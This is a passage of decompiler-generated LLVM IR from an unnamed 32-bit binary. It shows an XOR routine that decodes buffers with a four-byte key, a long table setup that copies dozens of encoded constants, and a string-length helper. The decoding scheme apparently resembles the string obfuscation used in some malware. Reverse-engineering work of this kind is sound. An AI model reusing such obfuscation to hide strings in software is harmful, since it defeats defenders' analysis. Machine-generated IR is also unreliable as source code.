  %v4_8051ce9 = icmp eq i16 %v3_8051ce9, 0
  br i1 %v4_8051ce9, label %dec_label_pc_8051d3a, label %dec_label_pc_8051cf0

dec_label_pc_8051cf0:                             ; preds = %dec_label_pc_8051cd0
  store i32 %v1_8051ce4, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8051cf8 = udiv i32 %v1_8051ce4, 16777216
  %v2_8051cfb = udiv i32 %v1_8051ce4, 256
  store i32 %v2_8051cfb, i32* %edi.global-to-local, align 4
  %v5_8051cfe = trunc i32 %v2_8051cf8 to i8
  store i8 %v5_8051cfe, i8* %stack_var_-44, align 1
  %v2_8051d01 = udiv i32 %v1_8051ce4, 65536
  store i32 %v2_8051d01, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051d04

dec_label_pc_8051d04:                             ; preds = %dec_label_pc_8051d04.dec_label_pc_8051d04_crit_edge, %dec_label_pc_8051cf0
  %v0_8051d0a = phi i32 [ %v0_8051d0a.pre, %dec_label_pc_8051d04.dec_label_pc_8051d04_crit_edge ], [ %v1_8051ce4, %dec_label_pc_8051cf0 ]
  %v0_8051d06 = phi i32 [ %v1_8051d36, %dec_label_pc_8051d04.dec_label_pc_8051d04_crit_edge ], [ 0, %dec_label_pc_8051cf0 ]
  %v0_8051d04 = phi i32 [ %v0_8051d2e, %dec_label_pc_8051d04.dec_label_pc_8051d04_crit_edge ], [ %v2_8051cdd, %dec_label_pc_8051cf0 ]
  %v1_8051d04 = inttoptr i32 %v0_8051d04 to i32*
  %v2_8051d04 = load i32, i32* %v1_8051d04, align 4
  %v2_8051d08 = add i32 %v2_8051d04, %v0_8051d06
  %v1_8051d0c = inttoptr i32 %v2_8051d08 to i8*
  %v2_8051d0c = load i8, i8* %v1_8051d0c, align 1
  %v4_8051d0c = trunc i32 %v0_8051d0a to i8
  %v5_8051d0c = xor i8 %v2_8051d0c, %v4_8051d0c
  store i8 %v5_8051d0c, i8* %v1_8051d0c, align 1
  %v0_8051d0e = load i32, i32* %edx.global-to-local, align 4
  %v0_8051d10 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051d10 = inttoptr i32 %v0_8051d10 to i32*
  %v2_8051d10 = load i32, i32* %v1_8051d10, align 4
  %v2_8051d12 = add i32 %v2_8051d10, %v0_8051d0e
  %v0_8051d14 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051d16 = inttoptr i32 %v2_8051d12 to i8*
  %v2_8051d16 = load i8, i8* %v1_8051d16, align 1
  %v4_8051d16 = trunc i32 %v0_8051d14 to i8
  %v5_8051d16 = xor i8 %v2_8051d16, %v4_8051d16
  store i8 %v5_8051d16, i8* %v1_8051d16, align 1
  %v0_8051d18 = load i32, i32* %edx.global-to-local, align 4
  %v0_8051d1a = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051d1a = inttoptr i32 %v0_8051d1a to i32*
  %v2_8051d1a = load i32, i32* %v1_8051d1a, align 4
  %v2_8051d1c = add i32 %v2_8051d1a, %v0_8051d18
  %v0_8051d1e = load i32, i32* %esi.global-to-local, align 4
  %v1_8051d20 = inttoptr i32 %v2_8051d1c to i8*
  %v2_8051d20 = load i8, i8* %v1_8051d20, align 1
  %v4_8051d20 = trunc i32 %v0_8051d1e to i8
  %v5_8051d20 = xor i8 %v2_8051d20, %v4_8051d20
  store i8 %v5_8051d20, i8* %v1_8051d20, align 1
  %v0_8051d22 = load i32, i32* %edx.global-to-local, align 4
  %v0_8051d24 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051d24 = inttoptr i32 %v0_8051d24 to i32*
  %v2_8051d24 = load i32, i32* %v1_8051d24, align 4
  %v1_8051d26 = add i32 %v0_8051d22, 1
  store i32 %v1_8051d26, i32* %edx.global-to-local, align 4
  %v2_8051d27 = add i32 %v2_8051d24, %v0_8051d22
  %v2_8051d29 = load i8, i8* %stack_var_-44, align 1
  %v1_8051d2c = inttoptr i32 %v2_8051d27 to i8*
  %v2_8051d2c = load i8, i8* %v1_8051d2c, align 1
  %v5_8051d2c = xor i8 %v2_8051d2c, %v2_8051d29
  store i8 %v5_8051d2c, i8* %v1_8051d2c, align 1
  %v0_8051d2e = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051d2e = add i32 %v0_8051d2e, 4
  %v2_8051d2e = inttoptr i32 %v1_8051d2e to i32*
  %v3_8051d2e = load i32, i32* %v2_8051d2e, align 4
  %v1_8051d31 = urem i32 %v3_8051d2e, 65536
  %v1_8051d36 = load i32, i32* %edx.global-to-local, align 4
  %v8_8051d38 = icmp sgt i32 %v1_8051d31, %v1_8051d36
  br i1 %v8_8051d38, label %dec_label_pc_8051d04.dec_label_pc_8051d04_crit_edge, label %dec_label_pc_8051d3a.loopexit

dec_label_pc_8051d04.dec_label_pc_8051d04_crit_edge: ; preds = %dec_label_pc_8051d04
  %v0_8051d0a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051d04

dec_label_pc_8051d3a.loopexit:                    ; preds = %dec_label_pc_8051d04
  br label %dec_label_pc_8051d3a

dec_label_pc_8051d3a:                             ; preds = %dec_label_pc_8051d3a.loopexit, %dec_label_pc_8051cd0
  %v0_8051d41 = phi i32 [ %v1_8051d31, %dec_label_pc_8051d3a.loopexit ], [ %v1_8051ce4, %dec_label_pc_8051cd0 ]
  ret i32 %v0_8051d41

; uselistorder directives
  uselistorder i32 %v1_8051d36, { 1, 0 }
  uselistorder i32 %v1_8051d31, { 1, 0 }
  uselistorder i32 %v0_8051d2e, { 1, 0 }
  uselistorder i32 %v1_8051ce4, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8057360.52 to i32), i32 4), { 1, 2, 0 }
  uselistorder i16* @global_var_80571dc.53, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8057360.52 to i32), { 1, 2, 3, 0 }
}

define i32 @function_8051d50() local_unnamed_addr {
dec_label_pc_8051d50:
  %v1_8051d56 = call i32 @function_8053554(i32 12)
  store i32 %v1_8051d56, i32* @ebx, align 4
  %v4_8051d68 = call i32 @function_8052680(i32 %v1_8051d56, i32 ptrtoint ([13 x i8]* @global_var_8055724.54 to i32), i32 12)
  %v0_8051d6d = load i32, i32* @ebx, align 4
  store i32 %v0_8051d6d, i32* @global_var_8057378.55, align 8
  store i16 12, i16* bitcast (i32* @global_var_805737c.56 to i16*), align 4
  %v1_8051d83 = call i32 @function_8053554(i32 2)
  store i32 %v1_8051d83, i32* @ebx, align 4
  %v4_8051d95 = call i32 @function_8052680(i32 %v1_8051d83, i32 ptrtoint (i32* @global_var_8055731.57 to i32), i32 2)
  %v0_8051d9a = load i32, i32* @ebx, align 4
  store i32 %v0_8051d9a, i32* @global_var_8057380.58, align 128
  store i16 2, i16* bitcast (i32* @global_var_8057384.59 to i16*), align 4
  %v1_8051db0 = call i32 @function_8053554(i32 12)
  store i32 %v1_8051db0, i32* @ebx, align 4
  %v4_8051dc2 = call i32 @function_8052680(i32 %v1_8051db0, i32 ptrtoint ([13 x i8]* @global_var_8055724.54 to i32), i32 12)
  %v0_8051dc7 = load i32, i32* @ebx, align 4
  store i32 %v0_8051dc7, i32* @global_var_80573f0.60, align 16
  store i16 12, i16* bitcast (i32* @global_var_80573f4.61 to i16*), align 4
  %v1_8051ddd = call i32 @function_8053554(i32 2)
  store i32 %v1_8051ddd, i32* @ebx, align 4
  %v4_8051def = call i32 @function_8052680(i32 %v1_8051ddd, i32 ptrtoint (i32* @global_var_8055734.62 to i32), i32 2)
  %v0_8051df4 = load i32, i32* @ebx, align 4
  store i32 %v0_8051df4, i32* @global_var_80573f8.63, align 8
  store i16 2, i16* bitcast (i32* @global_var_80573fc.64 to i16*), align 4
  %v1_8051e0a = call i32 @function_8053554(i32 15)
  store i32 %v1_8051e0a, i32* @ebx, align 4
  %v4_8051e1c = call i32 @function_8052680(i32 %v1_8051e0a, i32 ptrtoint (i32* @global_var_8055737.65 to i32), i32 15)
  %v0_8051e21 = load i32, i32* @ebx, align 4
  store i32 %v0_8051e21, i32* @global_var_8057370.66, align 16
  store i16 15, i16* bitcast (i32* @global_var_8057374.67 to i16*), align 4
  %v1_8051e37 = call i32 @function_8053554(i32 29)
  store i32 %v1_8051e37, i32* @ebx, align 4
  %v4_8051e49 = call i32 @function_8052680(i32 %v1_8051e37, i32 ptrtoint (i32* @global_var_8055747.68 to i32), i32 29)
  %v0_8051e4e = load i32, i32* @ebx, align 4
  store i32 %v0_8051e4e, i32* @global_var_8057388.69, align 8
  store i16 29, i16* bitcast (i32* @global_var_805738c.70 to i16*), align 4
  %v1_8051e64 = call i32 @function_8053554(i32 7)
  store i32 %v1_8051e64, i32* @ebx, align 4
  %v4_8051e76 = call i32 @function_8052680(i32 %v1_8051e64, i32 ptrtoint ([8 x i8]* @global_var_8055765.71 to i32), i32 7)
  %v0_8051e7b = load i32, i32* @ebx, align 4
  store i32 %v0_8051e7b, i32* @global_var_8057390.72, align 16
  store i16 7, i16* bitcast (i32* @global_var_8057394.73 to i16*), align 4
  %v1_8051e91 = call i32 @function_8053554(i32 5)
  store i32 %v1_8051e91, i32* @ebx, align 4
  %v4_8051ea3 = call i32 @function_8052680(i32 %v1_8051e91, i32 ptrtoint ([6 x i8]* @global_var_805576d.74 to i32), i32 5)
  %v0_8051ea8 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ea8, i32* @global_var_8057398.75, align 8
  store i16 5, i16* bitcast (i32* @global_var_805739c.76 to i16*), align 4
  %v1_8051ebe = call i32 @function_8053554(i32 11)
  store i32 %v1_8051ebe, i32* @ebx, align 4
  %v4_8051ed0 = call i32 @function_8052680(i32 %v1_8051ebe, i32 ptrtoint (i32* @global_var_8055773.77 to i32), i32 11)
  %v0_8051ed5 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ed5, i32* @global_var_80573a0.78, align 32
  store i16 11, i16* bitcast (i32* @global_var_80573a4.79 to i16*), align 4
  %v1_8051eeb = call i32 @function_8053554(i32 4)
  store i32 %v1_8051eeb, i32* @ebx, align 4
  %v4_8051efd = call i32 @function_8052680(i32 %v1_8051eeb, i32 ptrtoint ([5 x i8]* @global_var_805577f.80 to i32), i32 4)
  %v0_8051f02 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f02, i32* @global_var_80573a8.81, align 8
  store i16 4, i16* bitcast (i32* @global_var_80573ac.82 to i16*), align 4
  %v1_8051f18 = call i32 @function_8053554(i32 7)
  store i32 %v1_8051f18, i32* @ebx, align 4
  %v4_8051f2a = call i32 @function_8052680(i32 %v1_8051f18, i32 ptrtoint ([8 x i8]* @global_var_8055784.83 to i32), i32 7)
  %v0_8051f2f = load i32, i32* @ebx, align 4
  store i32 %v0_8051f2f, i32* @global_var_80573b0.84, align 16
  store i16 7, i16* bitcast (i32* @global_var_80573b4.85 to i16*), align 4
  %v1_8051f45 = call i32 @function_8053554(i32 8)
  store i32 %v1_8051f45, i32* @ebx, align 4
  %v4_8051f57 = call i32 @function_8052680(i32 %v1_8051f45, i32 ptrtoint ([9 x i8]* @global_var_805578c.86 to i32), i32 8)
  %v0_8051f5c = load i32, i32* @ebx, align 4
  store i32 %v0_8051f5c, i32* @global_var_80573b8.87, align 8
  store i16 8, i16* bitcast (i32* @global_var_80573bc.88 to i16*), align 4
  %v1_8051f72 = call i32 @function_8053554(i32 13)
  store i32 %v1_8051f72, i32* @ebx, align 4
  %v4_8051f84 = call i32 @function_8052680(i32 %v1_8051f72, i32 ptrtoint (i32* @global_var_8055795.89 to i32), i32 13)
  %v0_8051f89 = load i32, i32* @ebx, align 4
  store i32 %v0_8051f89, i32* @global_var_80573c0.90, align 64
  store i16 13, i16* bitcast (i32* @global_var_80573c4.91 to i16*), align 4
  %v1_8051f9f = call i32 @function_8053554(i32 10)
  store i32 %v1_8051f9f, i32* @ebx, align 4
  %v4_8051fb1 = call i32 @function_8052680(i32 %v1_8051f9f, i32 ptrtoint ([11 x i8]* @global_var_80557a3.92 to i32), i32 10)
  %v0_8051fb6 = load i32, i32* @ebx, align 4
  store i32 %v0_8051fb6, i32* @global_var_80573c8.93, align 8
  store i16 10, i16* bitcast (i32* @global_var_80573cc.94 to i16*), align 4
  %v1_8051fcc = call i32 @function_8053554(i32 10)
  store i32 %v1_8051fcc, i32* @ebx, align 4
  %v4_8051fde = call i32 @function_8052680(i32 %v1_8051fcc, i32 ptrtoint ([11 x i8]* @global_var_80557ae.95 to i32), i32 10)
  %v0_8051fe3 = load i32, i32* @ebx, align 4
  store i32 %v0_8051fe3, i32* @global_var_80573d0.96, align 16
  store i16 10, i16* bitcast (i32* @global_var_80573d4.97 to i16*), align 4
  %v1_8051ff9 = call i32 @function_8053554(i32 33)
  store i32 %v1_8051ff9, i32* @ebx, align 4
  %v4_805200b = call i32 @function_8052680(i32 %v1_8051ff9, i32 ptrtoint (i32* @global_var_805592c.98 to i32), i32 33)
  %v0_8052010 = load i32, i32* @ebx, align 4
  store i32 %v0_8052010, i32* @global_var_80573d8.99, align 8
  store i16 33, i16* bitcast (i32* @global_var_80573dc.100 to i16*), align 4
  %v1_8052026 = call i32 @function_8053554(i32 8)
  store i32 %v1_8052026, i32* @ebx, align 4
  %v4_8052038 = call i32 @function_8052680(i32 %v1_8052026, i32 ptrtoint ([9 x i8]* @global_var_80557b9.101 to i32), i32 8)
  %v0_805203d = load i32, i32* @ebx, align 4
  store i32 %v0_805203d, i32* @global_var_80573e0.102, align 32
  store i16 8, i16* bitcast (i32* @global_var_80573e4.103 to i16*), align 4
  %v1_8052053 = call i32 @function_8053554(i32 11)
  store i32 %v1_8052053, i32* @ebx, align 4
  %v4_8052065 = call i32 @function_8052680(i32 %v1_8052053, i32 ptrtoint ([12 x i8]* @global_var_80557c2.104 to i32), i32 11)
  %v0_805206a = load i32, i32* @ebx, align 4
  store i32 %v0_805206a, i32* @global_var_80573e8.105, align 8
  store i16 11, i16* bitcast (i32* @global_var_80573ec.106 to i16*), align 4
  %v1_8052080 = call i32 @function_8053554(i32 6)
  store i32 %v1_8052080, i32* @ebx, align 4
  %v4_8052092 = call i32 @function_8052680(i32 %v1_8052080, i32 ptrtoint ([7 x i8]* @global_var_80557ce.107 to i32), i32 6)
  %v0_8052097 = load i32, i32* @ebx, align 4
  store i32 %v0_8052097, i32* @global_var_8057400.108, align 1024
  store i16 6, i16* bitcast (i32* @global_var_8057404.109 to i16*), align 4
  %v1_80520ad = call i32 @function_8053554(i32 7)
  store i32 %v1_80520ad, i32* @ebx, align 4
  %v4_80520bf = call i32 @function_8052680(i32 %v1_80520ad, i32 ptrtoint ([8 x i8]* @global_var_80557d5.110 to i32), i32 7)
  %v0_80520c4 = load i32, i32* @ebx, align 4
  store i32 %v0_80520c4, i32* @global_var_8057408.111, align 8
  store i16 7, i16* bitcast (i32* @global_var_805740c.112 to i16*), align 4
  %v1_80520da = call i32 @function_8053554(i32 7)
  store i32 %v1_80520da, i32* @ebx, align 4
  %v4_80520ec = call i32 @function_8052680(i32 %v1_80520da, i32 ptrtoint ([8 x i8]* @global_var_80557dd.113 to i32), i32 7)
  %v0_80520f1 = load i32, i32* @ebx, align 4
  store i32 %v0_80520f1, i32* @global_var_8057410.114, align 16
  store i16 7, i16* bitcast (i32* @global_var_8057414.115 to i16*), align 4
  %v1_8052107 = call i32 @function_8053554(i32 3)
  store i32 %v1_8052107, i32* @ebx, align 4
  %v4_8052119 = call i32 @function_8052680(i32 %v1_8052107, i32 ptrtoint ([4 x i8]* @global_var_80557e5.116 to i32), i32 3)
  %v0_805211e = load i32, i32* @ebx, align 4
  store i32 %v0_805211e, i32* @global_var_8057418.117, align 8
  store i16 3, i16* bitcast (i32* @global_var_805741c.118 to i16*), align 4
  %v1_8052134 = call i32 @function_8053554(i32 19)
  store i32 %v1_8052134, i32* @ebx, align 4
  %v4_8052146 = call i32 @function_8052680(i32 %v1_8052134, i32 ptrtoint (i32* @global_var_80557e9.119 to i32), i32 19)
  %v0_805214b = load i32, i32* @ebx, align 4
  store i32 %v0_805214b, i32* @global_var_8057420.120, align 32
  store i16 19, i16* bitcast (i32* @global_var_8057424.121 to i16*), align 4
  %v1_8052161 = call i32 @function_8053554(i32 24)
  store i32 %v1_8052161, i32* @ebx, align 4
  %v4_8052173 = call i32 @function_8052680(i32 %v1_8052161, i32 ptrtoint (i32* @global_var_80557fd.122 to i32), i32 24)
  %v0_8052178 = load i32, i32* @ebx, align 4
  store i32 %v0_8052178, i32* @global_var_8057428.123, align 8
  store i16 24, i16* bitcast (i32* @global_var_805742c.124 to i16*), align 4
  %v1_805218e = call i32 @function_8053554(i32 9)
  store i32 %v1_805218e, i32* @ebx, align 4
  %v4_80521a0 = call i32 @function_8052680(i32 %v1_805218e, i32 ptrtoint ([10 x i8]* @global_var_8055816.125 to i32), i32 9)
  %v0_80521a5 = load i32, i32* @ebx, align 4
  store i32 %v0_80521a5, i32* @global_var_8057430.126, align 16
  store i16 9, i16* bitcast (i32* @global_var_8057434.127 to i16*), align 4
  %v1_80521bb = call i32 @function_8053554(i32 16)
  store i32 %v1_80521bb, i32* @ebx, align 4
  %v4_80521cd = call i32 @function_8052680(i32 %v1_80521bb, i32 ptrtoint (i32* @global_var_8055820.128 to i32), i32 16)
  %v0_80521d2 = load i32, i32* @ebx, align 4
  store i32 %v0_80521d2, i32* @global_var_8057438.129, align 8
  store i16 16, i16* bitcast (i32* @global_var_805743c.130 to i16*), align 4
  %v1_80521e8 = call i32 @function_8053554(i32 22)
  store i32 %v1_80521e8, i32* @ebx, align 4
  %v4_80521fa = call i32 @function_8052680(i32 %v1_80521e8, i32 ptrtoint (i32* @global_var_8055831.131 to i32), i32 22)
  %v0_80521ff = load i32, i32* @ebx, align 4
  store i32 %v0_80521ff, i32* @global_var_8057440.132, align 64
  store i16 22, i16* bitcast (i32* @global_var_8057444.133 to i16*), align 4
  %v1_8052215 = call i32 @function_8053554(i32 21)
  store i32 %v1_8052215, i32* @ebx, align 4
  %v4_8052227 = call i32 @function_8052680(i32 %v1_8052215, i32 ptrtoint (i32* @global_var_8055848.134 to i32), i32 21)
  %v0_805222c = load i32, i32* @ebx, align 4
  store i32 %v0_805222c, i32* @global_var_8057448.135, align 8
  store i16 21, i16* bitcast (i32* @global_var_805744c.136 to i16*), align 4
  %v1_8052242 = call i32 @function_8053554(i32 17)
  store i32 %v1_8052242, i32* @ebx, align 4
  %v4_8052254 = call i32 @function_8052680(i32 %v1_8052242, i32 ptrtoint ([18 x i8]* @global_var_805585e.137 to i32), i32 17)
  %v0_8052259 = load i32, i32* @ebx, align 4
  store i32 %v0_8052259, i32* @global_var_8057450.138, align 16
  store i16 17, i16* bitcast (i32* @global_var_8057454.139 to i16*), align 4
  %v1_805226f = call i32 @function_8053554(i32 12)
  store i32 %v1_805226f, i32* @ebx, align 4
  %v4_8052281 = call i32 @function_8052680(i32 %v1_805226f, i32 ptrtoint (i32* @global_var_8055870.140 to i32), i32 12)
  %v0_8052286 = load i32, i32* @ebx, align 4
  store i32 %v0_8052286, i32* @global_var_8057458.141, align 8
  store i16 12, i16* bitcast (i32* @global_var_805745c.142 to i16*), align 4
  %v1_805229c = call i32 @function_8053554(i32 23)
  store i32 %v1_805229c, i32* @ebx, align 4
  %v4_80522ae = call i32 @function_8052680(i32 %v1_805229c, i32 ptrtoint (i32* @global_var_805587d.143 to i32), i32 23)
  %v0_80522b3 = load i32, i32* @ebx, align 4
  store i32 %v0_80522b3, i32* @global_var_8057460.144, align 32
  store i16 23, i16* bitcast (i32* @global_var_8057464.145 to i16*), align 4
  %v1_80522c9 = call i32 @function_8053554(i32 83)
  store i32 %v1_80522c9, i32* @ebx, align 4
  %v4_80522db = call i32 @function_8052680(i32 %v1_80522c9, i32 ptrtoint (i32* @global_var_8055950.146 to i32), i32 83)
  %v0_80522e0 = load i32, i32* @ebx, align 4
  store i32 %v0_80522e0, i32* @global_var_8057468.147, align 8
  store i16 83, i16* bitcast (i32* @global_var_805746c.148 to i16*), align 4
  %v1_80522f6 = call i32 @function_8053554(i32 32)
  store i32 %v1_80522f6, i32* @ebx, align 4
  %v4_8052308 = call i32 @function_8052680(i32 %v1_80522f6, i32 ptrtoint (i32* @global_var_80559a4.149 to i32), i32 32)
  %v0_805230d = load i32, i32* @ebx, align 4
  store i32 %v0_805230d, i32* @global_var_8057470.150, align 16
  store i16 32, i16* bitcast (i32* @global_var_8057474.151 to i16*), align 4
  %v1_8052323 = call i32 @function_8053554(i32 48)
  store i32 %v1_8052323, i32* @ebx, align 4
  %v4_8052335 = call i32 @function_8052680(i32 %v1_8052323, i32 ptrtoint (i32* @global_var_80559c8.152 to i32), i32 48)
  %v0_805233a = load i32, i32* @ebx, align 4
  store i32 %v0_805233a, i32* @global_var_8057478.153, align 8
  store i16 48, i16* bitcast (i32* @global_var_805747c.154 to i16*), align 4
  %v1_8052350 = call i32 @function_8053554(i32 12)
  store i32 %v1_8052350, i32* @ebx, align 4
  %v4_8052362 = call i32 @function_8052680(i32 %v1_8052350, i32 ptrtoint (i32* @global_var_8055895.155 to i32), i32 12)
  %v0_8052367 = load i32, i32* @ebx, align 4
  store i32 %v0_8052367, i32* @global_var_8057480.156, align 128
  store i16 12, i16* bitcast (i32* @global_var_8057484.157 to i16*), align 4
  %v1_805237d = call i32 @function_8053554(i32 9)
  store i32 %v1_805237d, i32* @ebx, align 4
  %v4_805238f = call i32 @function_8052680(i32 %v1_805237d, i32 ptrtoint (i32* @global_var_80558a2.158 to i32), i32 9)
  %v0_8052394 = load i32, i32* @ebx, align 4
  store i32 %v0_8052394, i32* @global_var_8057488.159, align 8
  store i16 9, i16* bitcast (i32* @global_var_805748c.160 to i16*), align 4
  %v1_80523aa = call i32 @function_8053554(i32 10)
  store i32 %v1_80523aa, i32* @ebx, align 4
  %v4_80523bc = call i32 @function_8052680(i32 %v1_80523aa, i32 ptrtoint (i32* @global_var_80558ac.161 to i32), i32 10)
  %v0_80523c1 = load i32, i32* @ebx, align 4
  store i32 %v0_80523c1, i32* @global_var_8057490.162, align 16
  store i16 10, i16* bitcast (i32* @global_var_8057494.163 to i16*), align 4
  %v1_80523d7 = call i32 @function_8053554(i32 12)
  store i32 %v1_80523d7, i32* @ebx, align 4
  %v4_80523e9 = call i32 @function_8052680(i32 %v1_80523d7, i32 ptrtoint (i32* @global_var_80558b7.164 to i32), i32 12)
  %v0_80523ee = load i32, i32* @ebx, align 4
  store i32 %v0_80523ee, i32* @global_var_8057498.165, align 8
  store i16 12, i16* bitcast (i32* @global_var_805749c.166 to i16*), align 4
  %v1_8052404 = call i32 @function_8053554(i32 16)
  store i32 %v1_8052404, i32* @ebx, align 4
  %v4_8052416 = call i32 @function_8052680(i32 %v1_8052404, i32 ptrtoint (i32* @global_var_80558c4.167 to i32), i32 16)
  %v0_805241b = load i32, i32* @ebx, align 4
  store i32 %v0_805241b, i32* @global_var_80574a0.168, align 32
  store i16 16, i16* bitcast (i32* @global_var_80574a4.169 to i16*), align 4
  %v1_8052431 = call i32 @function_8053554(i32 19)
  store i32 %v1_8052431, i32* @ebx, align 4
  %v4_8052443 = call i32 @function_8052680(i32 %v1_8052431, i32 ptrtoint (i32* @global_var_80558d5.170 to i32), i32 19)
  %v0_8052448 = load i32, i32* @ebx, align 4
  store i32 %v0_8052448, i32* @global_var_80574a8.171, align 8
  store i16 19, i16* bitcast (i32* @global_var_80574ac.172 to i16*), align 4
  %v1_805245e = call i32 @function_8053554(i32 8)
  store i32 %v1_805245e, i32* @ebx, align 4
  %v4_8052470 = call i32 @function_8052680(i32 %v1_805245e, i32 ptrtoint ([9 x i8]* @global_var_80558e9.173 to i32), i32 8)
  %v0_8052475 = load i32, i32* @ebx, align 4
  store i32 %v0_8052475, i32* @global_var_80574b0.174, align 16
  store i16 8, i16* bitcast (i32* @global_var_80574b4.175 to i16*), align 4
  %v1_805248b = call i32 @function_8053554(i32 11)
  store i32 %v1_805248b, i32* @ebx, align 4
  %v4_805249d = call i32 @function_8052680(i32 %v1_805248b, i32 ptrtoint (i32* @global_var_8055889.176 to i32), i32 11)
  %v0_80524a2 = load i32, i32* @ebx, align 4
  store i32 %v0_80524a2, i32* @global_var_80574b8.177, align 8
  store i16 11, i16* bitcast (i32* @global_var_80574bc.178 to i16*), align 4
  %v1_80524b8 = call i32 @function_8053554(i32 12)
  store i32 %v1_80524b8, i32* @ebx, align 4
  %v4_80524ca = call i32 @function_8052680(i32 %v1_80524b8, i32 ptrtoint (i32* @global_var_80558f2.179 to i32), i32 12)
  %v0_80524cf = load i32, i32* @ebx, align 4
  store i32 %v0_80524cf, i32* @global_var_80574c0.180, align 64
  store i16 12, i16* bitcast (i32* @global_var_80574c4.181 to i16*), align 4
  %v1_80524e5 = call i32 @function_8053554(i32 18)
  store i32 %v1_80524e5, i32* @ebx, align 4
  %v4_80524f7 = call i32 @function_8052680(i32 %v1_80524e5, i32 ptrtoint (i32* @global_var_80558ff.182 to i32), i32 18)
  %v0_80524fc = load i32, i32* @ebx, align 4
  store i32 %v0_80524fc, i32* @global_var_80574c8.183, align 8
  store i16 18, i16* bitcast (i32* @global_var_80574cc.184 to i16*), align 4
  %v1_8052512 = call i32 @function_8053554(i32 25)
  store i32 %v1_8052512, i32* @ebx, align 4
  %v4_8052524 = call i32 @function_8052680(i32 %v1_8052512, i32 ptrtoint (i32* @global_var_8055912.185 to i32), i32 25)
  %v0_8052529 = load i32, i32* @ebx, align 4
  store i32 %v0_8052529, i32* @global_var_80574d0.186, align 16
  store i16 25, i16* bitcast (i32* @global_var_80574d4.187 to i16*), align 4
  %v1_805253f = call i32 @function_8053554(i32 111)
  store i32 %v1_805253f, i32* @ebx, align 4
  %v4_8052551 = call i32 @function_8052680(i32 %v1_805253f, i32 ptrtoint (i32* @global_var_80559fc.188 to i32), i32 111)
  %v0_8052556 = load i32, i32* @ebx, align 4
  store i32 %v0_8052556, i32* @global_var_80574d8.189, align 8
  store i16 111, i16* bitcast (i32* @global_var_80574dc.190 to i16*), align 4
  %v1_805256c = call i32 @function_8053554(i32 111)
  store i32 %v1_805256c, i32* @ebx, align 4
  %v4_805257e = call i32 @function_8052680(i32 %v1_805256c, i32 ptrtoint (i32* @global_var_8055a6c.191 to i32), i32 111)
  %v0_8052583 = load i32, i32* @ebx, align 4
  store i32 %v0_8052583, i32* @global_var_80574e0.192, align 32
  store i16 111, i16* bitcast (i32* @global_var_80574e4.193 to i16*), align 4
  %v1_8052599 = call i32 @function_8053554(i32 110)
  store i32 %v1_8052599, i32* @ebx, align 4
  %v4_80525ab = call i32 @function_8052680(i32 %v1_8052599, i32 ptrtoint (i32* @global_var_8055adc.194 to i32), i32 110)
  %v0_80525b0 = load i32, i32* @ebx, align 4
  store i32 %v0_80525b0, i32* @global_var_80574e8.195, align 8
  store i16 110, i16* bitcast (i32* @global_var_80574ec.196 to i16*), align 4
  %v1_80525c6 = call i32 @function_8053554(i32 110)
  store i32 %v1_80525c6, i32* @ebx, align 4
  %v4_80525d8 = call i32 @function_8052680(i32 %v1_80525c6, i32 ptrtoint (i32* @global_var_8055b4c.197 to i32), i32 110)
  %v0_80525dd = load i32, i32* @ebx, align 4
  store i32 %v0_80525dd, i32* @global_var_80574f0.198, align 16
  store i16 110, i16* bitcast (i32* @global_var_80574f4.199 to i16*), align 4
  %v1_80525f3 = call i32 @function_8053554(i32 117)
  store i32 %v1_80525f3, i32* @ebx, align 4
  %v4_8052605 = call i32 @function_8052680(i32 %v1_80525f3, i32 ptrtoint (i32* @global_var_8055bbc.200 to i32), i32 117)
  %v0_805260a = load i32, i32* @ebx, align 4
  store i32 %v0_805260a, i32* @global_var_80574f8.201, align 8
  store i16 117, i16* bitcast (i32* @global_var_80574fc.202 to i16*), align 4
  ret i32 %v4_8052605

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @function_8052680, { 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_8052620(i8* %arg1) local_unnamed_addr {
dec_label_pc_8052620:
  %v4_8052620 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052620, i32* @edx, align 4
  %v2_8052626 = load i8, i8* %arg1, align 1
  %v3_8052626 = icmp eq i8 %v2_8052626, 0
  br i1 %v3_8052626, label %dec_label_pc_8052637, label %dec_label_pc_8052630

dec_label_pc_8052630:                             ; preds = %dec_label_pc_8052620, %dec_label_pc_8052630
  %v0_8052630 = phi i32 [ %v1_8052630, %dec_label_pc_8052630 ], [ 0, %dec_label_pc_8052620 ]
  %v1_8052630 = add i32 %v0_8052630, 1
  %v2_8052631 = add i32 %v1_8052630, %v4_8052620
  %v3_8052631 = inttoptr i32 %v2_8052631 to i8*
  %v4_8052631 = load i8, i8* %v3_8052631, align 1
  %v5_8052631 = icmp eq i8 %v4_8052631, 0
  %v1_8052635 = icmp eq i1 %v5_8052631, false
  br i1 %v1_8052635, label %dec_label_pc_8052630, label %dec_label_pc_8052637

dec_label_pc_8052637:                             ; preds = %dec_label_pc_8052630, %dec_label_pc_8052620
  %v0_8052637 = phi i32 [ 0, %dec_label_pc_8052620 ], [ %v1_8052630, %dec_label_pc_8052630 ]
  ret i32 %v0_8052637

; uselistorder directives
  uselistorder label %dec_label_pc_8052630, { 1, 0 }
}

define i32 @function_8052640(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052640:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
